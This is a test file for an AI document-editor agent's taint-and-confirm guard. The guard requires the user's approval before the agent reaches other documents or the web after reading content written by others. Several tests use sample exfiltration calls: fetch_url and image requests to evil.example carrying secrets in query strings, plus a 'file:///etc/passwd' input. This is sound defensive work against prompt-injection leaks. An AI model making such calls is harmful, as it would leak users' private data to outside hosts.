import { describe, it, expect, vi } from 'vitest'
import { CONFIRM_WHEN_TAINTED } from '../../../server/utils/ai/tools/registry'
import {
  CrossBoundaryGuard,
  extractTypedUrls,
  normalizeUrlForCompare,
  type CrossBoundaryDeps,
  type CrossBoundaryInit
} from '../../../server/utils/agentic/crossBoundary'

// Taint + confirm gate (A1). A session that has only seen the invoker's
// own text runs as before; once it has read something written by
// someone else, tools that reach the invoker's other documents,
// knowledge or the web wait for the invoker's explicit approval.

function makeGuard(init: Partial<CrossBoundaryInit> = {}, deps: Partial<CrossBoundaryDeps> = {}) {
  const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => false)
  const guard = new CrossBoundaryGuard(
    { initialTaint: null, invokerText: [], knowledgeFiles: new Map(), ...init },
    {
      isDocSolo: async () => true,
      isSessionDocSolo: async () => true,
      describeDoc: async () => null,
      commentsHaveForeignAuthors: () => false,
      workspaceHasOtherEditors: async () => true,
      confirm,
      ...deps
    }
  )
  // `confirm` is the default mock; tests that pass their own keep a handle to it.
  return { guard, confirm }
}

const signal = new AbortController().signal

describe('solo session (nothing foreign read)', () => {
  it('never asks: every tool runs as before', async () => {
    const { guard, confirm } = makeGuard()
    for (const name of [...CONFIRM_WHEN_TAINTED, 'fetch_url', 'view_image']) {
      expect(guard.needsConfirmation(name, { url: 'https://x.example/', src: 'https://x.example/a.png' })).toBe(false)
      expect(await guard.beforeTool(name, {}, signal)).toEqual({ allowed: true })
    }
    expect(confirm).not.toHaveBeenCalled()
    expect(guard.tainted).toBe(false)
  })

  it('reading the solo doc, own comments or own knowledge keeps it clean', async () => {
    const { guard } = makeGuard({ knowledgeFiles: new Map([['k1', { filename: 'notes.md', foreign: false }]]) })
    await guard.afterTool('view_document', {}, { isError: false })
    await guard.afterTool('read_comments', {}, { isError: false })
    await guard.afterTool('search_knowledge', { query: 'x' }, { isError: false })
    await guard.afterTool('get_knowledge_file', { knowledge_id: 'k1' }, { isError: false })
    await guard.afterTool('view_other_document', { doc_id: 'mine' }, { isError: false })
    expect(guard.tainted).toBe(false)
  })
})

describe('taint sources', () => {
  it.each([
    ['web_search', { query: 'q' }],
    ['fetch_url', { url: 'https://a.example' }],
    ['view_image', { src: 'https://a.example/x.png' }],
    ['list_workspace_documents', {}],
    ['list_folders', { workspace_id: 'ws-other' }]
  ])('%s taints the session', async (name, args) => {
    const { guard } = makeGuard()
    await guard.afterTool(name, args, { isError: false })
    expect(guard.tainted).toBe(true)
  })

  it('workspace document titles taint only when others can edit in the workspace', async () => {
    const { guard } = makeGuard({}, { workspaceHasOtherEditors: async () => false })
    await guard.afterTool('list_workspace_documents', {}, { isError: false })
    expect(guard.tainted).toBe(false)
  })

  it('search results taint unless every hit is the invoker\'s solo document', async () => {
    const hits = (...ids: string[]) => JSON.stringify({ query: 'q', results: ids.map(id => ({ doc_id: id, title: id, snippet: '' })) })
    const deps = { isDocSolo: async (ref: string) => ref.startsWith('mine') }
    const own = makeGuard({}, deps).guard
    await own.afterTool('search_documents', { query: 'q' }, { isError: false, content: hits('mine-1', 'mine-2') })
    await own.afterTool('search_documents', { query: 'q' }, { isError: false, content: 'No documents match "q". Try other words.' })
    expect(own.tainted).toBe(false)

    const mixed = makeGuard({}, deps).guard
    await mixed.afterTool('search_documents', { query: 'q' }, { isError: false, content: hits('mine-1', 'theirs') })
    expect(mixed.tainted).toBe(true)

    for (const content of [undefined, 'not json', '{"results":[{"title":"no id"}]}']) {
      const odd = makeGuard({}, deps).guard
      await odd.afterTool('search_documents', { query: 'q' }, { isError: false, content })
      expect(odd.tainted).toBe(true)
    }
  })

  it('folder names taint only when they can be someone else\'s', async () => {
    const solo = makeGuard({}, { workspaceHasOtherEditors: async () => false }).guard
    await solo.afterTool('list_folders', {}, { isError: false })
    await solo.afterTool('list_folders', { workspace_id: 'personal' }, { isError: false })
    expect(solo.tainted).toBe(false)
    const shared = makeGuard({}, { workspaceHasOtherEditors: async () => true }).guard
    await shared.afterTool('list_folders', {}, { isError: false })
    expect(shared.tainted).toBe(true)
  })

  it.each(['search_documents', 'list_folders', 'move_document', 'create_folder'])('%s asks first once the session is tainted', (name) => {
    const { guard } = makeGuard({ initialTaint: 'shared document' })
    expect(guard.needsConfirmation(name, {})).toBe(true)
  })

  it('a failed tool call does not taint', async () => {
    const { guard } = makeGuard()
    await guard.afterTool('web_search', { query: 'q' }, { isError: true })
    expect(guard.tainted).toBe(false)
  })

  it('internal images (the doc\'s own uploads) do not taint', async () => {
    const { guard } = makeGuard()
    await guard.afterTool('view_image', { src: '/api/files/doc1/abc.png' }, { isError: false })
    expect(guard.tainted).toBe(false)
  })

  it('another person\'s document taints; the invoker\'s solo doc does not', async () => {
    const { guard } = makeGuard({}, { isDocSolo: async ref => ref === 'mine' })
    await guard.afterTool('view_other_document', { doc_id: 'mine' }, { isError: false })
    expect(guard.tainted).toBe(false)
    await guard.afterTool('view_other_document', { doc_id: 'shared' }, { isError: false })
    expect(guard.tainted).toBe(true)
  })

  it('comments by other people taint', async () => {
    const { guard } = makeGuard({}, { commentsHaveForeignAuthors: () => true })
    await guard.afterTool('read_comments', {}, { isError: false })
    expect(guard.tainted).toBe(true)
  })

  it('knowledge uploaded by someone else taints (search, and reading that file or an unknown id)', async () => {
    const files = new Map([['mine', { filename: 'a.md', foreign: false }], ['theirs', { filename: 'b.md', foreign: true }]])
    const search = makeGuard({ knowledgeFiles: files }).guard
    await search.afterTool('search_knowledge', { query: 'x' }, { isError: false })
    expect(search.tainted).toBe(true)

    const own = makeGuard({ knowledgeFiles: files }).guard
    await own.afterTool('get_knowledge_file', { knowledge_id: 'mine' }, { isError: false })
    expect(own.tainted).toBe(false)
    await own.afterTool('get_knowledge_file', { knowledge_id: 'theirs' }, { isError: false })
    expect(own.tainted).toBe(true)

    const unknown = makeGuard({ knowledgeFiles: files }).guard
    await unknown.afterTool('get_knowledge_file', { knowledge_id: 'other' }, { isError: false })
    expect(unknown.tainted).toBe(true)
  })

  it('a failing provenance lookup taints (fail closed)', async () => {
    const { guard } = makeGuard({}, {
      isDocSolo: async () => {
        throw new Error('db down')
      }
    })
    await guard.afterTool('view_other_document', { doc_id: 'x' }, { isError: false })
    expect(guard.tainted).toBe(true)
  })

  it('a session can start tainted (shared document)', () => {
    const { guard } = makeGuard({ initialTaint: 'the shared document' })
    expect(guard.tainted).toBe(true)
    expect(guard.taintReasons).toEqual(['the shared document'])
  })
})

describe('tainted session', () => {
  it.each([...CONFIRM_WHEN_TAINTED])('%s asks the invoker, and runs only on allow', async (name) => {
    const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => true)
    const { guard } = makeGuard({ initialTaint: 'shared' }, { confirm })
    expect(guard.needsConfirmation(name, {})).toBe(true)
    expect(await guard.beforeTool(name, { query: 'q' }, signal)).toEqual({ allowed: true })
    expect(confirm).toHaveBeenCalledTimes(1)
  })

  it('deny → a tool error telling the model not to retry', async () => {
    const { guard } = makeGuard({ initialTaint: 'shared' })
    const r = await guard.beforeTool('list_my_documents', {}, signal)
    expect(r).toMatchObject({ allowed: false, message: expect.stringMatching(/did not allow.*Do not retry/s) })
  })

  it('labels the request with the document title, query, URL or filename', async () => {
    const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => false)
    const { guard } = makeGuard(
      { initialTaint: 'shared', knowledgeFiles: new Map([['k1', { filename: 'Pricing.pdf', foreign: true }]]) },
      { confirm, describeDoc: async ref => (ref === 'abc' ? 'Q3 plan' : null) }
    )
    await guard.beforeTool('view_other_document', { doc_id: 'abc' }, signal)
    await guard.beforeTool('view_other_document', { doc_id: 'unknown-id' }, signal)
    await guard.beforeTool('web_search', { query: 'acme salaries' }, signal)
    await guard.beforeTool('fetch_url', { url: 'https://evil.example/?d=secret' }, signal)
    await guard.beforeTool('get_knowledge_file', { knowledge_id: 'k1' }, signal)
    await guard.beforeTool('list_my_documents', {}, signal)
    expect(confirm.mock.calls.map(c => c[0])).toEqual([
      { tool: 'view_other_document', target: 'Q3 plan' },
      { tool: 'view_other_document', target: 'unknown-id' },
      { tool: 'web_search', target: 'acme salaries' },
      { tool: 'fetch_url', target: 'https://evil.example/?d=secret' },
      { tool: 'get_knowledge_file', target: 'Pricing.pdf' },
      { tool: 'list_my_documents', target: null }
    ])
  })

  it('an allowed call is remembered for identical arguments only', async () => {
    const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => true)
    const { guard } = makeGuard({ initialTaint: 'shared' }, { confirm })
    await guard.beforeTool('web_search', { query: 'a' }, signal)
    await guard.beforeTool('web_search', { query: 'a' }, signal)
    expect(confirm).toHaveBeenCalledTimes(1)
    await guard.beforeTool('web_search', { query: 'b' }, signal)
    expect(confirm).toHaveBeenCalledTimes(2)
  })

  it('fetch_url runs without asking only for a URL the invoker typed, exactly', async () => {
    const { guard, confirm } = makeGuard({
      initialTaint: 'shared',
      invokerText: ['Summarise https://example.com/report?id=7 and docs.example.org/guide please.']
    })
    expect(guard.needsConfirmation('fetch_url', { url: 'https://example.com/report?id=7' })).toBe(false)
    expect(guard.needsConfirmation('fetch_url', { url: 'docs.example.org/guide' })).toBe(false)
    expect(guard.needsConfirmation('fetch_url', { url: 'https://DOCS.example.org/guide' })).toBe(false)
    // Anything appended (the classic exfiltration move) or a different URL asks.
    expect(guard.needsConfirmation('fetch_url', { url: 'https://example.com/report?id=7&leak=secret' })).toBe(true)
    expect(guard.needsConfirmation('fetch_url', { url: 'https://example.com/other' })).toBe(true)
    expect(guard.needsConfirmation('fetch_url', { url: 'https://evil.example/?q=x' })).toBe(true)
    expect(await guard.beforeTool('fetch_url', { url: 'https://example.com/report?id=7' }, signal)).toEqual({ allowed: true })
    expect(confirm).not.toHaveBeenCalled()
  })

  it('external view_image asks unless typed; internal images never ask', () => {
    const { guard } = makeGuard({ initialTaint: 'shared', invokerText: ['use https://img.example/a.png'] })
    expect(guard.needsConfirmation('view_image', { src: '/api/files/d/x.png' })).toBe(false)
    expect(guard.needsConfirmation('view_image', { src: 'https://img.example/a.png' })).toBe(false)
    expect(guard.needsConfirmation('view_image', { src: 'https://evil.example/p.png?d=1' })).toBe(true)
  })

  it('doc-local tools never ask', () => {
    const { guard } = makeGuard({ initialTaint: 'shared' })
    for (const name of ['view_document', 'replace_text', 'insert_text', 'read_comments', 'create_comment', 'reply_to_comment', 'update_theme', 'set_title', 'generate_image', 'message_to_user', 'search_activity_log']) {
      expect(guard.needsConfirmation(name, {})).toBe(false)
    }
  })

  it('a confirmation that errors counts as deny; a failing label falls back to null', async () => {
    const { guard } = makeGuard({ initialTaint: 'shared' }, {
      confirm: async () => {
        throw new Error('channel down')
      },
      describeDoc: async () => {
        throw new Error('db down')
      }
    })
    const r = await guard.beforeTool('view_other_document', { doc_id: 'x' }, signal)
    expect(r.allowed).toBe(false)
  })

  it('a deny with a note hands the initiator\'s words to the model as an instruction', async () => {
    const { guard } = makeGuard({ initialTaint: 'shared' }, {
      confirm: async () => ({ allowed: false, note: '  No, search for "EU pricing" instead  ' })
    })
    const r = await guard.beforeTool('web_search', { query: 'pricing' }, signal)
    expect(r.allowed).toBe(false)
    const message = r.allowed ? '' : r.message
    expect(message).toContain('did not allow this web_search call')
    expect(message).toContain(JSON.stringify('No, search for "EU pricing" instead'))
    expect(message).not.toContain('did not answer')
  })

  it('a note is bounded, and an allow never carries one', async () => {
    const { guard } = makeGuard({ initialTaint: 'shared' }, {
      confirm: async () => ({ allowed: false, note: 'y'.repeat(1_000) })
    })
    const r = await guard.beforeTool('list_my_documents', {}, signal)
    expect(r.allowed ? '' : r.message).toContain(JSON.stringify('y'.repeat(300)))
    expect(r.allowed ? '' : r.message).not.toContain('y'.repeat(301))

    const allowed = makeGuard({ initialTaint: 'shared' }, { confirm: async () => ({ allowed: true, note: 'ignored' }) })
    expect(await allowed.guard.beforeTool('list_my_documents', {}, signal)).toEqual({ allowed: true })
  })

  it('a deny without a note keeps the generic decline', async () => {
    const { guard } = makeGuard({ initialTaint: 'shared' }, { confirm: async () => ({ allowed: false, note: null }) })
    const r = await guard.beforeTool('list_my_documents', {}, signal)
    expect(r.allowed ? '' : r.message).toMatch(/did not answer\)\. Do not retry it/)
  })

  it('forwards the abort signal to the confirmation', async () => {
    const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => false)
    const { guard } = makeGuard({ initialTaint: 'shared' }, { confirm })
    const ac = new AbortController()
    await guard.beforeTool('list_my_documents', {}, ac.signal)
    expect(confirm.mock.calls[0]?.[1]).toBe(ac.signal)
  })
})

describe('URL helpers', () => {
  it('normalises scheme-less input, host case, trailing slash and fragment', () => {
    expect(normalizeUrlForCompare('Example.COM')).toBe('https://example.com')
    expect(normalizeUrlForCompare('https://example.com/')).toBe('https://example.com')
    expect(normalizeUrlForCompare('https://example.com/a#frag')).toBe('https://example.com/a')
    expect(normalizeUrlForCompare('https://example.com/a?x=1')).toBe('https://example.com/a?x=1')
  })

  it('rejects non-http(s) schemes and junk', () => {
    expect(normalizeUrlForCompare('file:///etc/passwd')).toBe(null)
    expect(normalizeUrlForCompare('')).toBe(null)
  })

  it('extracts URLs from prose, dropping trailing punctuation', () => {
    expect([...extractTypedUrls('See https://a.example/x, and b.example.org.')].sort())
      .toEqual(['https://a.example/x', 'https://b.example.org'])
  })
})

describe('delegated jobs', () => {
  it('scan items and job excerpts taint the session when the document is shared', async () => {
    const { guard } = makeGuard({}, { isSessionDocSolo: async () => false })
    await guard.afterTool('delegate_scan', { targets: 'all', extract: 'terms' }, { isError: false })
    expect(guard.tainted).toBe(true)
  })

  it('stay clean on a solo document', async () => {
    const { guard } = makeGuard()
    await guard.afterTool('delegate_rewrite', { job_id: 'j-x', action: 'status' }, { isError: false })
    expect(guard.tainted).toBe(false)
  })
})

describe('project context', () => {
  const list = (...ids: string[]) => JSON.stringify({ context_documents: ids.map(id => ({ context_doc_id: id, title: id, applies_to: 'whole workspace', characters: 10 })), omitted: 0 })
  const deps = { isDocSolo: async (ref: string) => ref.startsWith('mine') }

  it('reading one context document taints unless it is the invoker\'s solo document', async () => {
    const own = makeGuard({}, deps).guard
    await own.afterTool('read_project_context', { context_doc_id: 'mine-bible' }, { isError: false, content: 'text' })
    expect(own.tainted).toBe(false)
    const shared = makeGuard({}, deps).guard
    await shared.afterTool('read_project_context', { context_doc_id: 'team-glossary' }, { isError: false, content: 'text' })
    expect(shared.taintReasons).toEqual(['project context'])
  })

  it('the list taints when any listed document is not solo, and fails closed on an unreadable result', async () => {
    const own = makeGuard({}, deps).guard
    await own.afterTool('read_project_context', {}, { isError: false, content: list('mine-a', 'mine-b') })
    expect(own.tainted).toBe(false)
    const mixed = makeGuard({}, deps).guard
    await mixed.afterTool('read_project_context', {}, { isError: false, content: list('mine-a', 'team-b') })
    expect(mixed.tainted).toBe(true)
    const garbled = makeGuard({}, deps).guard
    await garbled.afterTool('read_project_context', {}, { isError: false, content: 'not json' })
    expect(garbled.tainted).toBe(true)
  })

  it('reading needs no confirmation even in a tainted session (the documents are in the prompt already)', () => {
    const { guard } = makeGuard({ initialTaint: 'project context written by other people' })
    expect(guard.needsConfirmation('read_project_context', { context_doc_id: 'x' })).toBe(false)
  })

  it('editing a context document is cross-boundary: asked for once tainted, labelled with its title', async () => {
    const confirm = vi.fn<CrossBoundaryDeps['confirm']>(async () => false)
    const { guard } = makeGuard({ initialTaint: 'project context written by other people' }, { confirm, describeDoc: async ref => (ref === 'bible' ? 'Story bible' : null) })
    const r = await guard.beforeTool('edit_project_context', { context_doc_id: 'bible', new_str: 'Mara' }, signal)
    expect(r.allowed).toBe(false)
    expect(confirm.mock.calls[0]?.[0]).toEqual({ tool: 'edit_project_context', target: 'Story bible' })
  })

  it('a solo session edits its own context document without asking', () => {
    const { guard } = makeGuard()
    expect(guard.needsConfirmation('edit_project_context', { context_doc_id: 'bible', new_str: 'x' })).toBe(false)
  })
})
